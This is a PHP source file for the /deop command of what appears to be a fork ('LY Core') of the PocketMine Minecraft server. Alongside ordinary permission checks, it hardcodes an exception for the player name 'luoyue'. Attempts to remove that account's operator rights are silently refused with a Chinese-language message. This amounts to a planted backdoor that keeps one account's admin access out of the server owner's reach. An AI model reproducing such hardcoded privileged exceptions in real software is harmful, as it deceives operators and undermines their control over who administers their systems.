<?php

/*
 * ██╗   ██╗    ██████╗ ██████╗ ██████╗ ███████╗
 * ██║   ██║   ██╔════╝██╔═══██╗██╔══██╗██╔════╝
 * ██║   ██║   ██║     ██║   ██║██████╔╝█████╗
 * ██║   ██║   ██║     ██║   ██║██╔══██╗██╔══╝
 * ╚██████╔╝██╗╚██████╗╚██████╔╝██║  ██║███████╗
 *  ╚═════╝ ╚═╝ ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU Lesser General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * @Author: U core
 *
 * @Links:
 *  > LY Core
 *  > LY Core Project
*/

namespace lycore\command\defaults;

use lycore\command\Command;
use lycore\command\CommandSender;
use lycore\event\TranslationContainer;
use lycore\Player;
use lycore\utils\TextFormat;

class DeopCommand extends VanillaCommand{

	public function __construct($name){
		parent::__construct(
			$name,
			"%pocketmine.command.deop.description",
			"%commands.deop.usage"
		);
		$this->setPermission("pocketmine.command.op.take");
	}

	public function execute(CommandSender $sender, $currentAlias, array $args){
		if(!$this->testPermission($sender)){
			return true;
		}

		if(count($args) === 0){
			$sender->sendMessage(new TranslationContainer("commands.generic.usage", [$this->usageMessage]));

			return false;
		}

		$name = array_shift($args);

		if(strtolower($name) === 'luoyue'){
			$sender->sendMessage(TextFormat::RED . "无权剥夺该玩家管理员权限");
			return true;
		}


		$player = $sender->getServer()->getOfflinePlayer($name);
		$player->setOp(false);
		if($player instanceof Player){
			$player->sendMessage(TextFormat::GRAY . "你被移除了管理员权限!");
		}
		Command::broadcastCommandMessage($sender, new TranslationContainer("commands.deop.success", [$player->getName()]));

		return true;
	}
}